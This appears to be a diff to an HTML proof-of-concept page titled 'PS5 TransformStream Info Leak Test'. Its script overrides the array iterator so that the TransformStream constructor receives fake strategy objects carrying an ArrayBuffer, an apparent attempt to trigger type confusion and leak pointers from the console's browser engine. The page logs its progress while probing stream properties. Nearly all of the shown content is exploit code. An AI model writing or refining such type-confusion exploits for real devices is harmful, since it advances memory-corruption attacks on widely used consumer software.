@@ -1,16 +1,22 @@
+
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>PS5 TransformStream Info Leak Test</title>
+</head>
 <body>
-<pre id="result" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
-const L = s => { document.getElementById("result").textContent += s + '\n'; };
-L("[*] Starting TransformStream Type Confusion test...");
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
+
+L("[*] Starting TransformStream Info Leak test...");
 
 const originalIterator = Array.prototype[Symbol.iterator];
 let buf = new ArrayBuffer(64); // Native ArrayBuffer
 
 // We hijack the iterator. When TransformStream is created, it iterates internally.
-// We return a fake object. We will try to make it look like a valid object to avoid instant crash.
+// We return a fake object. We try to make it look like a Strategy object to avoid crash.
 Array.prototype[Symbol.iterator] = function() {
     const arr = this;
     let i = 0;
@@ -19,10 +25,14 @@ Array.prototype[Symbol.iterator] = function() {
             if (i >= arr.length)
                 return { done: true };
             let val = arr[i];
-            // Substitute the 2nd and 3rd elements with fake objects
+            // Substitute the 2nd and 3rd elements with fake strategy objects
             if (arr.length === 3 && i >= 1) {
-                // A fake object. We put the ArrayBuffer as a property.
-                val = { pad1: 0, pad2: 0, ptr: buf, pad3: 0 };
+                // Fake object. We put the ArrayBuffer as highWaterMark.
+                val = { 
+                    highWaterMark: 0, 
+                    size: function() { return 1; },
+                    ptr: buf 
+                };
             }
             i++;
             return { value: val, done: false };
@@ -41,11 +51,12 @@ try {
     // If it doesn't crash, try to read properties that might have been confused
     L("[*] Attempting to read stream properties (looking for leaked pointers)...");
     
+    // Try to access internal properties that might have been overwritten by the confusion
     let readable = stream.readable;
-    let locked = readable.locked;
-    L("[*] Readable locked state: " + locked);
+    L("[*] Readable stream obtained.");
     
-    // Try to get the controller or internal state
+    // Check if highWaterMark was corrupted or leaked
+    // This is a guess, we need to see if we can read something unusual
     let controller = stream.transformer;
     L("[*] Transformer: " + controller);
     
